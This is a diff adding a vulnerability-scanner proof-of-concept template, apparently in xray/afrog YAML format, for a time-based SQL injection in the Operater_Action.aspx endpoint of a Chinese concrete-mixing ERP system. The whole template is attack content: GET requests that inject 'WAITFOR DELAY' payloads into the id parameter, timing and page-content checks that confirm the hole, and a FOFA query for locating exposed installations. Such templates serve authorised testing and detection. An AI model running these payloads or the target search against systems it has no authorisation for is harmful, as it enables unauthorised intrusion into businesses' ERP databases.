@@ -1,0 +1,25 @@
+id: poc-yaml-shanghun-erp-operater-action-aspx-sqli
+info:
+  name: 商混ERP系统 Operater_Action接口存在sql注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 商混ERP
+  fofa: app="商混ERP系统"
+variables:
+  t1: random_int(3,5)
+  t2: t1*2
+  t3: t2 + 2
+  t4: random_int(1,3)
+  t5: t4*2
+  t6: t5 + 2
+requests:
+- method: GET
+  path: /Dispatch/Operater_Action.aspx?action=TaskComplete&id=1%27WAITFOR+DELAY+%270:0:{{.t1}}%27--
+  expression: "status_code == 200 && \ncontains(gbk_decode(body),\"无标题页\") &&\ncontains(body,\"\
+    window.location.href='Schedule.aspx?\") &&\nduration >= t2 &&\nduration <= t3\n"
+- method: GET
+  path: /Dispatch/Operater_Action.aspx?action=TaskComplete&id=1%27WAITFOR+DELAY+%270:0:{{.t4}}%27--
+  expression: "status_code == 200 && \ncontains(gbk_decode(body),\"无标题页\") &&\ncontains(body,\"\
+    window.location.href='Schedule.aspx?\") &&\nduration >= t5 &&\nduration <= t6\n"
+transport: http
